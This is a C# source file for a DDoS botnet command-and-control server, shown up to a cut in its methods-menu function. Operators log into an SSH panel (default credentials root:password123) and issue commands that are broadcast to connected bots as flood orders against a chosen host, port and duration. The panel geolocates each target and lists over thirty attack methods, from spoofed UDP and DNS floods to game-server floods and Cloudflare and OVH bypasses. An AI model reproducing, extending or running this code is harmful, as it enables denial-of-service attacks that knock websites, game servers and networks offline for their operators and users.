using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using FxSsh;
using FxSsh.Services;

namespace Agent
{
    public class UserConfig
    {
        [JsonPropertyName("username")]
        public string Username { get; set; } = string.Empty;

        [JsonPropertyName("password")]
        public string Password { get; set; } = string.Empty;
    }

    public class MethodConfig
    {
        [JsonPropertyName("name")]
        public string Name { get; set; } = string.Empty;

        [JsonPropertyName("cmd")]
        public string Cmd { get; set; } = string.Empty;
    }

    public class LineEditorState
    {
        public StringBuilder Buffer { get; } = new();
        public int CursorPos { get; set; } = 0;
        public List<string> History { get; } = new();
        public int HistoryIndex { get; set; } = -1;
        public string SavedCurrentInput { get; set; } = string.Empty;
        public List<byte> EscapeSeq { get; } = new();
        public bool InEscape { get; set; } = false;
    }

    internal class Program
    {
        private static int _port = 1337;
        private static int _internalSshPort = 0;
        private static int _botCount = 0;
        private static List<UserConfig> _users = new();
        private static List<MethodConfig> _methods = new();
        private static readonly ConcurrentDictionary<Channel, LineEditorState> _sessionStates = new();
        private static readonly ConcurrentDictionary<Channel, string> _channelUsers = new();
        private static readonly ConcurrentDictionary<TcpClient, NetworkStream> _botStreams = new();
        private static readonly ConcurrentDictionary<TcpClient, bool> _activeProxyClients = new();
        private static TcpListener? _mainListener;

        private static string GetTitleSequence() => $"\x1b]0;Connected {_botCount}\x07";

        static void Main(string[] args)
        {
            ParseArguments(args);
            LoadUsers();
            LoadMethods();

            // Bind internal SSH server to loopback on random free port
            var sshListener = new TcpListener(IPAddress.Loopback, 0);
            sshListener.Start();
            _internalSshPort = ((IPEndPoint)sshListener.LocalEndpoint).Port;
            sshListener.Stop();

            var startingInfo = new StartingInfo(IPAddress.Loopback, _internalSshPort, "SSH-2.0-AgentSSH");
            var server = new SshServer(startingInfo);

            string rsaKey = GetOrGenerateKey("hostkey_rsa.pem", () => KeyGenerator.GenerateRsaKeyPem(2048));
            server.AddHostKey("ssh-rsa", rsaKey);
            server.AddHostKey("rsa-sha2-256", rsaKey);
            server.AddHostKey("rsa-sha2-512", rsaKey);

            string ecdsaKey = GetOrGenerateKey("hostkey_ecdsa.pem", () => KeyGenerator.GenerateECDsaKeyPem("nistp256"));
            server.AddHostKey("ecdsa-sha2-nistp256", ecdsaKey);

            server.ConnectionAccepted += (sender, session) =>
            {
                try
                {
                    // Disable FxSsh default 30s session timeout and activate 5s SSH keep-alive
                    session.ConfigureKeepalive(TimeSpan.FromSeconds(5));

                    var timeoutField = typeof(Session).GetField("_timeout", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
                    timeoutField?.SetValue(session, TimeSpan.FromDays(365));
                }
                catch { }

                session.ServiceRegistered += (s, service) =>
                {
                    if (service is UserAuthService auth)
                    {
                        auth.UserAuth += (s2, authArgs) =>
                        {
                            if (authArgs.AuthMethod == "password")
                            {
                                var matched = _users.Exists(u =>
                                    string.Equals(u.Username, authArgs.Username, StringComparison.OrdinalIgnoreCase) &&
                                    (string.IsNullOrEmpty(u.Password) || u.Password == authArgs.Password));

                                if (matched)
                                {
                                    authArgs.Result = true;
                                    Console.WriteLine($"[+] Authenticated SSH user: {authArgs.Username}");
                                }
                                else
                                {
                                    authArgs.Result = false;
                                    Console.WriteLine($"[-] Failed SSH password authentication for user: {authArgs.Username}");
                                }
                            }
                            else if (authArgs.AuthMethod == "none")
                            {
                                var matched = _users.Exists(u =>
                                    string.Equals(u.Username, authArgs.Username, StringComparison.OrdinalIgnoreCase) &&
                                    string.IsNullOrEmpty(u.Password));

                                authArgs.Result = matched;
                            }
                            else
                            {
                                authArgs.Result = false;
                            }
                        };
                    }
                    else if (service is ConnectionService conn)
                    {
                        conn.CommandOpened += (s2, cmdArgs) =>
                        {
                            cmdArgs.Agreed = true;
                            var channel = cmdArgs.Channel;
                            string username = cmdArgs.AttachedUserAuthArgs?.Username ?? "root";
                            _channelUsers[channel] = username;
                            _sessionStates[channel] = new LineEditorState();

                            channel.DataReceived += (s3, dataMem) =>
                            {
                                HandleSessionData(channel, dataMem.ToArray());
                            };

                            channel.CloseReceived += (s3, e) =>
                            {
                                _sessionStates.TryRemove(channel, out _);
                                _channelUsers.TryRemove(channel, out _);
                            };

                            string prompt = $"\x1b[2J\x1b[3J\x1b[H{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] ";
                            channel.SendData(Encoding.UTF8.GetBytes(prompt));
                        };

                        conn.PtyReceived += (s2, ptyArgs) =>
                        {
                        };

                        conn.EnvReceived += (s2, envArgs) =>
                        {
                        };
                    }
                };
            };

            server.Start();

            // Start Unified Port Listener (SSH & Bot Multiplexer on single port)
            var mainListenerThread = new Thread(() => StartMultiplexListener(_port)) { IsBackground = true };
            mainListenerThread.Start();

            Console.WriteLine($"[+] Single Port Multiplexer active on port {_port} (SSH & Bot unified)");
            Console.WriteLine("[+] Press Ctrl+C to stop.");

            var waitHandle = new ManualResetEvent(false);
            Console.CancelKeyPress += (s, e) =>
            {
                e.Cancel = true;
                _mainListener?.Stop();
                server.Stop();
                waitHandle.Set();
            };
            waitHandle.WaitOne();
        }

        private static void StartMultiplexListener(int port)
        {
            try
            {
                _mainListener = new TcpListener(IPAddress.Any, port);
                _mainListener.Start();

                while (true)
                {
                    var client = _mainListener.AcceptTcpClient();
                    var th = new Thread(() => RouteIncomingConnection(client)) { IsBackground = true };
                    th.Start();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Main multiplexer listener stopped: {ex.Message}");
            }
        }

        private static void RouteIncomingConnection(TcpClient client)
        {
            try
            {
                var socket = client.Client;
                socket.ReceiveTimeout = 10000;
                var buffer = new byte[256];

                // Read client first message
                int received = socket.Receive(buffer, 0, buffer.Length, SocketFlags.None);
                socket.ReceiveTimeout = 0;

                if (received <= 0)
                {
                    client.Close();
                    return;
                }

                if (received >= 4 &&
                    buffer[0] == (byte)'S' &&
                    buffer[1] == (byte)'S' &&
                    buffer[2] == (byte)'H' &&
                    buffer[3] == (byte)'-')
                {
                    // Client is SSH
                    ProxyToInternalSsh(client, buffer, received);
                }
                else
                {
                    // Client is Bot
                    var stream = client.GetStream();
                    HandleBotClient(client, stream, buffer, received);
                }
            }
            catch
            {
                try { client.Close(); } catch { }
            }
        }

        private static void ProxyToInternalSsh(TcpClient externalClient, byte[] prefixData, int prefixLen)
        {
            TcpClient? internalClient = null;
            try
            {
                externalClient.NoDelay = true;
                externalClient.ReceiveTimeout = 0;
                externalClient.SendTimeout = 0;
                externalClient.Client.ReceiveTimeout = 0;
                externalClient.Client.SendTimeout = 0;
                externalClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);

                internalClient = new TcpClient();
                internalClient.NoDelay = true;
                internalClient.ReceiveTimeout = 0;
                internalClient.SendTimeout = 0;
                internalClient.Connect(IPAddress.Loopback, _internalSshPort);

                _activeProxyClients[externalClient] = true;
                _activeProxyClients[internalClient] = true;

                var extStream = externalClient.GetStream();
                var intStream = internalClient.GetStream();

                // Forward the SSH banner that was already read from external client to internal SSH server
                intStream.Write(prefixData, 0, prefixLen);

                using var cts = new CancellationTokenSource();

                var t1 = Task.Run(() =>
                {
                    byte[] buf = new byte[8192];
                    try
                    {
                        while (externalClient.Connected && internalClient.Connected)
                        {
                            int read = extStream.Read(buf, 0, buf.Length);
                            if (read <= 0) break;
                            intStream.Write(buf, 0, read);
                            intStream.Flush();
                        }
                    }
                    catch { }
                    finally
                    {
                        try { cts.Cancel(); } catch { }
                    }
                });

                var t2 = Task.Run(() =>
                {
                    byte[] buf = new byte[8192];
                    try
                    {
                        while (externalClient.Connected && internalClient.Connected)
                        {
                            int read = intStream.Read(buf, 0, buf.Length);
                            if (read <= 0) break;
                            extStream.Write(buf, 0, read);
                            extStream.Flush();
                        }
                    }
                    catch { }
                    finally
                    {
                        try { cts.Cancel(); } catch { }
                    }
                });

                // Wait until one side explicitly disconnects (e.g. user types exit or closes client)
                while (!cts.Token.IsCancellationRequested && externalClient.Connected && internalClient.Connected)
                {
                    Thread.Sleep(100);
                }
            }
            catch
            {
            }
            finally
            {
                _activeProxyClients.TryRemove(externalClient, out _);
                if (internalClient != null) _activeProxyClients.TryRemove(internalClient, out _);
                try { externalClient.Close(); } catch { }
                try { internalClient?.Close(); } catch { }
            }
        }

        private static void HandleBotClient(TcpClient client, NetworkStream stream, byte[] initialData, int initialLen)
        {
            Interlocked.Increment(ref _botCount);
            UpdateConnectedTitle();
            string botId = "unknown";

            try
            {
                _botStreams[client] = stream;
                stream.ReadTimeout = 45000;

                // Process the initial data already read during routing
                string firstMsg = Encoding.UTF8.GetString(initialData, 0, initialLen).Trim();
                if (firstMsg.StartsWith("HELLO "))
                {
                    botId = firstMsg.Substring(6).Trim();
                    Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
                }

                var buffer = new byte[1024];
                while (client.Connected)
                {
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead <= 0) break;

                    string msg = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    if (msg.StartsWith("HELLO "))
                    {
                        botId = msg.Substring(6).Trim();
                        Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
                    }
                    else if (msg == "PING")
                    {
                        byte[] pong = Encoding.UTF8.GetBytes("PONG\n");
                        stream.Write(pong, 0, pong.Length);
                    }
                }
            }
            catch
            {
            }
            finally
            {
                _botStreams.TryRemove(client, out _);
                client.Close();
                Interlocked.Decrement(ref _botCount);
                UpdateConnectedTitle();
                Console.WriteLine($"[-] Bot disconnected: {botId} (Total: {_botCount})");
            }
        }

        private static void UpdateConnectedTitle()
        {
            string titleSeq = GetTitleSequence();
            byte[] titleBytes = Encoding.UTF8.GetBytes(titleSeq);
            foreach (var channel in _channelUsers.Keys)
            {
                try
                {
                    channel.SendData(titleBytes);
                }
                catch
                {
                }
            }
        }

        private static void ParseArguments(string[] args)
        {
            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "-p" || args[i] == "--port") && i + 1 < args.Length)
                {
                    if (int.TryParse(args[i + 1], out int p))
                    {
                        _port = p;
                        i++;
                    }
                }
            }
        }

        private static void LoadUsers()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "users.json");
            if (!File.Exists(path))
            {
                path = "users.json";
            }

            if (File.Exists(path))
            {
                try
                {
                    string json = File.ReadAllText(path);
                    _users = JsonSerializer.Deserialize<List<UserConfig>>(json) ?? new List<UserConfig>();
                    Console.WriteLine($"[+] Loaded {_users.Count} user(s) from users.json");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error parsing users.json: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("[!] users.json not found, creating default user root:password123");
                _users = new List<UserConfig> { new UserConfig { Username = "root", Password = "password123" } };
                File.WriteAllText("users.json", JsonSerializer.Serialize(_users, new JsonSerializerOptions { WriteIndented = true }));
            }
        }

        private static void LoadMethods()
        {
            string path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "methods.json");
            if (!File.Exists(path))
            {
                path = "methods.json";
            }

            if (File.Exists(path))
            {
                try
                {
                    string json = File.ReadAllText(path);
                    _methods = JsonSerializer.Deserialize<List<MethodConfig>>(json) ?? new List<MethodConfig>();
                    Console.WriteLine($"[+] Loaded {_methods.Count} method(s) from methods.json");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Error parsing methods.json: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("[!] methods.json not found, creating default method");
                _methods = new List<MethodConfig>
                {
                    new MethodConfig { Name = "http", Cmd = "./flood http {host} {port} {time}" }
                };
                File.WriteAllText("methods.json", JsonSerializer.Serialize(_methods, new JsonSerializerOptions { WriteIndented = true }));
            }
        }

        private static void HandleSessionData(Channel channel, byte[] data)
        {
            if (!_sessionStates.TryGetValue(channel, out var state))
            {
                state = new LineEditorState();
                _sessionStates[channel] = state;
            }

            _channelUsers.TryGetValue(channel, out var username);
            if (string.IsNullOrEmpty(username)) username = "root";

            for (int i = 0; i < data.Length; i++)
            {
                byte b = data[i];

                if (b == 0x1B) // ESC
                {
                    state.InEscape = true;
                    state.EscapeSeq.Clear();
                    state.EscapeSeq.Add(b);
                    continue;
                }

                if (state.InEscape)
                {
                    state.EscapeSeq.Add(b);

                    // If sequence starts with \x1b[
                    if (state.EscapeSeq.Count >= 2 && state.EscapeSeq[0] == 0x1B && state.EscapeSeq[1] == (byte)'[')
                    {
                        // Final characters for CSI are typically @ through ~ (0x40 - 0x7E)
                        if (state.EscapeSeq.Count >= 3 && b >= 0x40 && b <= 0x7E)
                        {
                            HandleEscapeSequence(channel, state, state.EscapeSeq);
                            state.InEscape = false;
                            state.EscapeSeq.Clear();
                        }
                    }
                    else if (state.EscapeSeq.Count >= 2 && state.EscapeSeq[0] == 0x1B && (state.EscapeSeq[1] == (byte)'O' || state.EscapeSeq[1] == (byte)'N'))
                    {
                        if (state.EscapeSeq.Count >= 3)
                        {
                            HandleEscapeSequence(channel, state, state.EscapeSeq);
                            state.InEscape = false;
                            state.EscapeSeq.Clear();
                        }
                    }
                    else if (state.EscapeSeq.Count > 10)
                    {
                        state.InEscape = false;
                        state.EscapeSeq.Clear();
                    }
                    continue;
                }

                if (b == '\r' || b == '\n')
                {
                    channel.SendData(Encoding.UTF8.GetBytes("\r\n"));

                    string command = state.Buffer.ToString().Trim();
                    if (!string.IsNullOrEmpty(command))
                    {
                        // Add to history (avoid consecutive duplicates)
                        if (state.History.Count == 0 || state.History[state.History.Count - 1] != command)
                        {
                            state.History.Add(command);
                        }
                    }

                    state.Buffer.Clear();
                    state.CursorPos = 0;
                    state.HistoryIndex = -1;
                    state.SavedCurrentInput = string.Empty;

                    if (!string.IsNullOrEmpty(command))
                    {
                        ProcessCommand(channel, command);
                    }

                    channel.SendData(Encoding.UTF8.GetBytes($"{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] "));
                }
                else if (b == 0x08 || b == 0x7F) // Backspace
                {
                    if (state.CursorPos > 0)
                    {
                        state.Buffer.Remove(state.CursorPos - 1, 1);
                        state.CursorPos--;

                        // Redraw from cursor pos to end of line, then move cursor back
                        string remaining = state.Buffer.ToString().Substring(state.CursorPos) + " ";
                        string backSequence = new string('\b', remaining.Length);
                        channel.SendData(Encoding.UTF8.GetBytes($"\b{remaining}{backSequence}"));
                        if (state.CursorPos < state.Buffer.Length)
                        {
                            int shift = state.Buffer.Length - state.CursorPos;
                            channel.SendData(Encoding.UTF8.GetBytes(new string('\b', shift)));
                        }
                    }
                }
                else if (b == 0x03) // Ctrl+C
                {
                    state.Buffer.Clear();
                    state.CursorPos = 0;
                    state.HistoryIndex = -1;
                    state.SavedCurrentInput = string.Empty;

                    channel.SendData(Encoding.UTF8.GetBytes("^C\r\n"));
                    channel.SendData(Encoding.UTF8.GetBytes($"{GetTitleSequence()}[\x1b[94m{username}\x1b[0m@\x1b[94maihui\x1b[0m] "));
                }
                else if (b >= 32 && b <= 126) // Printable characters
                {
                    char c = (char)b;
                    if (state.CursorPos == state.Buffer.Length)
                    {
                        state.Buffer.Append(c);
                        state.CursorPos++;
                        channel.SendData(new byte[] { b });
                    }
                    else
                    {
                        state.Buffer.Insert(state.CursorPos, c);
                        state.CursorPos++;
                        string tail = state.Buffer.ToString().Substring(state.CursorPos - 1);
                        int shift = state.Buffer.Length - state.CursorPos;
                        string moveBack = shift > 0 ? new string('\b', shift) : "";
                        channel.SendData(Encoding.UTF8.GetBytes(tail + moveBack));
                    }
                }
            }
        }

        private static void HandleEscapeSequence(Channel channel, LineEditorState state, List<byte> seq)
        {
            string s = Encoding.ASCII.GetString(seq.ToArray());

            if (s == "\x1b[A" || s == "\x1bOA" || s.EndsWith("A")) // UP Arrow
            {
                if (state.History.Count == 0) return;

                if (state.HistoryIndex == -1)
                {
                    state.SavedCurrentInput = state.Buffer.ToString();
                    state.HistoryIndex = state.History.Count - 1;
                }
                else if (state.HistoryIndex > 0)
                {
                    state.HistoryIndex--;
                }

                SetInputBuffer(channel, state, state.History[state.HistoryIndex]);
            }
            else if (s == "\x1b[B" || s == "\x1bOB" || s.EndsWith("B")) // DOWN Arrow
            {
                if (state.HistoryIndex == -1) return;

                if (state.HistoryIndex < state.History.Count - 1)
                {
                    state.HistoryIndex++;
                    SetInputBuffer(channel, state, state.History[state.HistoryIndex]);
                }
                else
                {
                    state.HistoryIndex = -1;
                    SetInputBuffer(channel, state, state.SavedCurrentInput);
                }
            }
            else if (s == "\x1b[C" || s == "\x1bOC" || s.EndsWith("C")) // RIGHT Arrow
            {
                if (state.CursorPos < state.Buffer.Length)
                {
                    state.CursorPos++;
                    channel.SendData(Encoding.ASCII.GetBytes("\x1b[C"));
                }
            }
            else if (s == "\x1b[D" || s == "\x1bOD" || s.EndsWith("D")) // LEFT Arrow
            {
                if (state.CursorPos > 0)
                {
                    state.CursorPos--;
                    channel.SendData(Encoding.ASCII.GetBytes("\x1b[D"));
                }
            }
            else if (s == "\x1b[H" || s == "\x1b[1~" || s == "\x1b[7~") // HOME Key
            {
                if (state.CursorPos > 0)
                {
                    channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{state.CursorPos}D"));
                    state.CursorPos = 0;
                }
            }
            else if (s == "\x1b[F" || s == "\x1b[4~" || s == "\x1b[8~") // END Key
            {
                int diff = state.Buffer.Length - state.CursorPos;
                if (diff > 0)
                {
                    channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{diff}C"));
                    state.CursorPos = state.Buffer.Length;
                }
            }
            else if (s == "\x1b[3~") // DELETE Key
            {
                if (state.CursorPos < state.Buffer.Length)
                {
                    state.Buffer.Remove(state.CursorPos, 1);
                    string tail = state.Buffer.ToString().Substring(state.CursorPos) + " ";
                    int shift = state.Buffer.Length - state.CursorPos + 1;
                    string moveBack = new string('\b', shift);
                    channel.SendData(Encoding.UTF8.GetBytes(tail + moveBack));
                }
            }
        }

        private static void SetInputBuffer(Channel channel, LineEditorState state, string newText)
        {
            // Move cursor to start of buffer
            if (state.CursorPos > 0)
            {
                channel.SendData(Encoding.ASCII.GetBytes($"\x1b[{state.CursorPos}D"));
            }

            // Clear to end of line
            channel.SendData(Encoding.ASCII.GetBytes("\x1b[K"));

            // Replace buffer
            state.Buffer.Clear();
            state.Buffer.Append(newText);
            state.CursorPos = newText.Length;

            // Render new text
            channel.SendData(Encoding.UTF8.GetBytes(newText));
        }

        private static void ProcessCommand(Channel channel, string command)
        {
            var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length == 0) return;

            string cmdName = parts[0];

            if (cmdName.Equals("help", StringComparison.OrdinalIgnoreCase))
            {
                var sb = new StringBuilder();
                sb.AppendLine();
                sb.AppendLine("  \x1b[1;97mCOMMANDS\x1b[0m");
                sb.AppendLine("  \x1b[96mhelp\x1b[0m              \x1b[90m:\x1b[0m \x1b[38;5;250mShow available commands\x1b[0m");
                sb.AppendLine("  \x1b[96mmethods\x1b[0m           \x1b[90m:\x1b[0m \x1b[38;5;250mList all attack & flood methods\x1b[0m");
                sb.AppendLine("  \x1b[96mbots\x1b[0m              \x1b[90m:\x1b[0m \x1b[38;5;250mShow number of connected bots\x1b[0m");
                sb.AppendLine("  \x1b[96mclear / cls\x1b[0m       \x1b[90m:\x1b[0m \x1b[38;5;250mClear terminal screen\x1b[0m");
                sb.AppendLine("  \x1b[96mexit / quit\x1b[0m       \x1b[90m:\x1b[0m \x1b[38;5;250mDisconnect session\x1b[0m");
                sb.AppendLine();
                channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
            }
            else if (cmdName.Equals("methods", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes(GetFormattedMethodsMenu()));
            }
            else if (cmdName.Equals("bots", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes($"[+] Total connected bots: {_botCount}\r\n"));
            }
            else if (cmdName.Equals("clear", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("cls", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.ASCII.GetBytes("\x1b[2J\x1b[3J\x1b[H"));
            }
            else if (cmdName.Equals("exit", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("quit", StringComparison.OrdinalIgnoreCase))
            {
                channel.SendData(Encoding.UTF8.GetBytes("Goodbye!\r\n"));
                channel.SendClose();
            }
            else
            {
                string cleanCmd = cmdName.StartsWith(".") ? cmdName.Substring(1) : cmdName;
                var method = _methods.Find(m => string.Equals(m.Name, cleanCmd, StringComparison.OrdinalIgnoreCase) || string.Equals(m.Name, cmdName, StringComparison.OrdinalIgnoreCase));
                if (method != null)
                {
                    var placeholders = ExtractPlaceholders(method.Cmd);
                    var args = new string[parts.Length - 1];
                    Array.Copy(parts, 1, args, 0, parts.Length - 1);

                    if (args.Length < placeholders.Count)
                    {
                        string usage = string.Join(" ", placeholders);
                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} {usage}\x1b[0m\r\n"));
                        return;
                    }

                    string formattedCmd = method.Cmd;
                    for (int i = 0; i < placeholders.Count; i++)
                    {
                        formattedCmd = formattedCmd.Replace(placeholders[i], args[i]);
                    }

                    int dispatched = BroadcastToBots(formattedCmd);

                    string targetHost = args.Length > 0 ? args[0] : "N/A";
                    string targetPort = args.Length > 1 ? args[1] : "N/A";
                    string attackDuration = args.Length > 2 ? args[2] : "N/A";

                    string response = FormatDispatchResponse(method.Name, targetHost, targetPort, attackDuration, dispatched);
                    channel.SendData(Encoding.UTF8.GetBytes(response));
                }
                else
                {
                    channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Unknown command: {cmdName}. Type 'help' for available commands.\x1b[0m\r\n"));
                }
            }
        }

        private static readonly HttpClient _httpClient = new() { Timeout = TimeSpan.FromSeconds(3) };

        private class TargetGeoInfo
        {
            public string ResolvedIp { get; set; } = "N/A";
            public string Isp { get; set; } = "Unknown ISP";
            public string Region { get; set; } = "Unknown Region";
            public string Country { get; set; } = "Unknown Country";
            public string Asn { get; set; } = "Unknown ASN";
        }

        private static TargetGeoInfo ResolveTargetGeo(string rawHost)
        {
            var info = new TargetGeoInfo();
            try
            {
                string host = rawHost.Trim();
                if (host.StartsWith("http://", StringComparison.OrdinalIgnoreCase) || host.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                {
                    if (Uri.TryCreate(host, UriKind.Absolute, out var uri))
                    {
                        host = uri.Host;
                    }
                }

                if (IPAddress.TryParse(host, out var ip))
                {
                    info.ResolvedIp = ip.ToString();
                }
                else
                {
                    var addresses = Dns.GetHostAddresses(host);
                    if (addresses.Length > 0)
                    {
                        info.ResolvedIp = addresses[0].ToString();
                    }
                    else
                    {
                        info.ResolvedIp = host;
                    }
                }

                // Query ip-api for ISP / Region / ASN details
                if (info.ResolvedIp != "N/A")
                {
                    string url = $"http://ip-api.com/json/{info.ResolvedIp}?fields=status,country,regionName,isp,as";
                    var task = _httpClient.GetStringAsync(url);
                    if (task.Wait(2500))
                    {
                        using var doc = JsonDocument.Parse(task.Result);
                        var root = doc.RootElement;
                        if (root.TryGetProperty("status", out var statusProp) && statusProp.GetString() == "success")
                        {
                            if (root.TryGetProperty("country", out var cProp)) info.Country = cProp.GetString() ?? "Unknown";
                            if (root.TryGetProperty("regionName", out var rProp)) info.Region = rProp.GetString() ?? "Unknown";
                            if (root.TryGetProperty("isp", out var iProp)) info.Isp = iProp.GetString() ?? "Unknown";
                            if (root.TryGetProperty("as", out var aProp)) info.Asn = aProp.GetString() ?? "Unknown";
                        }
                    }
                }
            }
            catch
            {
                // Fallback gracefully on DNS/API errors
            }
            return info;
        }

        private static string FormatDispatchResponse(string methodName, string targetHost, string port, string time, int botCount)
        {
            var geo = ResolveTargetGeo(targetHost);
            var sb = new StringBuilder();
            sb.AppendLine();
            sb.AppendLine("  \x1b[1;92mATTACK DISPATCHED\x1b[0m");
            sb.AppendLine($"  \x1b[90mTarget   :\x1b[0m \x1b[97m{targetHost}\x1b[0m");
            sb.AppendLine($"  \x1b[90mIP       :\x1b[0m \x1b[38;5;45m{geo.ResolvedIp}\x1b[0m");
            sb.AppendLine($"  \x1b[90mPort     :\x1b[0m \x1b[93m{port}\x1b[0m");
            sb.AppendLine($"  \x1b[90mDuration :\x1b[0m \x1b[93m{time}s\x1b[0m");
            sb.AppendLine($"  \x1b[90mMethod   :\x1b[0m \x1b[96m.{methodName.ToUpper()}\x1b[0m");
            sb.AppendLine($"  \x1b[90mISP      :\x1b[0m \x1b[38;5;250m{geo.Isp}\x1b[0m");
            sb.AppendLine($"  \x1b[90mRegion   :\x1b[0m \x1b[38;5;250m{geo.Region}, {geo.Country}\x1b[0m");
            sb.AppendLine($"  \x1b[90mASN      :\x1b[0m \x1b[38;5;244m{geo.Asn}\x1b[0m");
            sb.AppendLine($"  \x1b[90mSwarm    :\x1b[0m \x1b[1;92mSent to {botCount} bot(s)\x1b[0m");
            sb.AppendLine();
            return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
        }

        private static List<string> ExtractPlaceholders(string template)
        {
            var list = new List<string>();
            var matches = System.Text.RegularExpressions.Regex.Matches(template, @"\{[^}]+\}");
            foreach (System.Text.RegularExpressions.Match match in matches)
            {
                list.Add(match.Value);
            }
            return list;
        }

        private static int BroadcastToBots(string command)
        {
            byte[] data = Encoding.UTF8.GetBytes(command + "\n");
            int count = 0;
            foreach (var kvp in _botStreams)
            {
                try
                {
                    kvp.Value.Write(data, 0, data.Length);
                    count++;
                }
                catch
                {
                }
            }
            return count;
        }

        private static string GetFormattedMethodsMenu()
        {
            if (_methods.Count == 0)
            {
                return "\x1b[91m  [!] No methods configured in methods.json\x1b[0m\r\n";
            }

            var descriptions = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
            {
                // LAYER 4 UDP
                ["dns"] = "DNS flood, overwhelms name servers with forged queries",
                ["udp"] = "UDP flood, massive spoofed datagram traffic",
                ["ldap"] = "LDAP flood, overwhelms directory servers with bulk binds",
                ["ssdp"] = "SSDP flood, overloads devices with discovery requests",
                ["home"] = "Home DNS flood, targets home network DNS servers",
                ["udpbypass"] = "UDP Bypass, packets designed to bypass filters",

                // LAYER 4 TCP
                ["tcp"] = "TCP flood, excessive connection requests",
                ["socket"] = "Socket flood, exhausts resources via open connections",
                ["ovh"] = "OVH bypass, anti-DDoS protection bypass",
                ["tcpmix"] = "TCP Mix, combines techniques to exhaust resources",
                ["tcpbypass"] = "TCP Bypass, packets designed to bypass filtering",
                ["ack"] = "ACK flood, disrupts connections with TCP ACK packets",

                // LAYER 4 GAME
                ["game"] = "Generic game flood, UDP packets disrupt gameplay",
                ["rainbow"] = "Rainbow Six flood, excessive UDP connection requests",
                ["rocket"] = "Rocket League flood, exhausts server via UDP connections",
                ["roblox"] = "Roblox flood, many TCP connections overload servers",
                ["fivem"] = "FiveM flood, mixed TCP floods disrupt multiplayer",
                ["pubg"] = "PUBG flood, crafted UDP packets bypass filters",
                ["fortnite"] = "Fortnite flood, UDP packets cause lag",
                ["warthunder"] = "War Thunder flood, massive UDP disruption",
                ["counter"] = "Counter-Strike flood, UDP packets cause delays",
                ["samp"] = "SA-MP flood, TCP/UDP floods overload servers",

                // LAYER 3
                ["subnet"] = "Subnet flood, ICMP packets to many IPs in a range",
                ["icmp"] = "ICMP flood, echo requests overload the network",

                // LAYER 7
                ["http"] = "HTTP flood, targets web servers via GET/POST",
                ["https"] = "HTTPS flood, encrypted requests on HTTPS endpoints",
                ["httpx"] = "HTTP-X, multi-protocol request flood",
                ["rapidflood"] = "Rapid flood, high rate application layer requests",
                ["tls"] = "TLS flood, handshake & encrypted session exhaustion",
                ["tlsx"] = "TLS-X, evades filtering at application layer",
                ["bypass"] = "Bypass, TLS/HTTPS related evasion technique",
                ["browser"] = "Browser, simulates real browser traffic (JS/headers)",
                ["cache"] = "Cache, requests that defeat caching mechanisms",
                ["cloudflare"] = "Cloudflare, HTTPS flood bypassing CF protection"
            };

            var l4Udp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "dns", "udp", "ldap", "ssdp", "home", "udpbypass" };
            var l4Tcp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "tcp", "socket", "ovh", "tcpmix", "tcpbypass", "ack" };
            var l4Game = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp" };
            var l3 = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "subnet", "icmp" };
            var l7 = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http", "https", "httpx", "rapidflood", "tls", "tlsx", "bypass", "browser", "cache", "cloudflare" };

            var sb = new StringBuilder();
            sb.AppendLine();
            sb.AppendLine("  \x1b[1;97mATTACK & FLOOD METHODS\x1b[0m");

            void AppendCategory(string title, string colorCode, HashSet<string> names)
            {
                var active = _methods.Where(m => names.Contains(m.Name)).ToList();
                if (active.Count == 0) return;

                sb.AppendLine();
                sb.AppendLine($"  {colorCode}{title}\x1b[0m");
                foreach (var m in active)
                {
                    string desc = descriptions.TryGetValue(m.Name, out var d) ? d : "Custom execution method";
                    sb.AppendLine($"    \x1b[96m.{m.Name,-13}\x1b[0m \x1b[90m:\x1b[0m \x1b[38;5;250m{desc}\x1b[0m");
                }
            }

